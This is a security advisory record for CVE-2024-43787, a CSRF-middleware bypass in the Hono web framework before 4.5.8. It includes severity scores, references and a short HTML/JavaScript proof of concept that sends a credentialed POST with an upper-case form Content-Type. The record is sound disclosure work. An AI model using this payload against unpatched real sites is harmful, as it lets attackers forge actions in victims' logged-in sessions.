advisory_id: GHSA-rpfr-3m35-5vx5
datasource_id: github_osv_importer_v2/GHSA-rpfr-3m35-5vx5
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-rpfr-3m35-5vx5/GHSA-rpfr-3m35-5vx5.json
aliases:
  - CVE-2024-43787
summary: |
  ### Summary

  Hono CSRF middleware can be bypassed using crafted Content-Type header.

  ### Details

  MIME types are case insensitive, but `isRequestedByFormElementRe` only matches lower-case.

  https://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17

  As a result, attacker can bypass csrf middleware using upper-case form-like MIME type, such as "Application/x-www-form-urlencoded".

  ### PoC

  ```html
  <html>
    <head>
      <title>CSRF Test</title>
      <script defer>
        document.addEventListener("DOMContentLoaded", () => {
          document.getElementById("btn").addEventListener("click", async () => {
            const res = await fetch("http://victim.example.com/test", {
              method: "POST",
              credentials: "include",
              headers: {
                "Content-Type": "Application/x-www-form-urlencoded",
              },
            });
          });
        });
      </script>
    </head>
    <body>
      <h1>CSRF Test</h1>
      <button id="btn">Click me!</button>
    </body>
  </html>
  ```

  ### Impact

  Bypass csrf protection implemented with hono csrf middleware.

  ### Discussion

  I'm not sure that omitting csrf checks for Simple POST request is a good idea.
  CSRF prevention and CORS are different concepts even though CORS can prevent CSRF in some cases.
impacted_packages:
  - purl: pkg:npm/hono
    affected_versions: vers:npm/<4.5.8
    fixed_versions: vers:npm/4.5.8
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.0'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-rpfr-3m35-5vx5/GHSA-rpfr-3m35-5vx5.json
  - score: '2.3'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-rpfr-3m35-5vx5/GHSA-rpfr-3m35-5vx5.json
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-352
references:
  - url: https://github.com/honojs/hono
    reference_type:
    reference_id:
  - url: https://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17
    reference_type:
    reference_id:
  - url: https://github.com/honojs/hono/commit/41ce840379516410dee60c783142e05bb5a22449
    reference_type:
    reference_id:
  - url: https://github.com/honojs/hono/security/advisories/GHSA-rpfr-3m35-5vx5
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-43787
    reference_type:
    reference_id: CVE-2024-43787
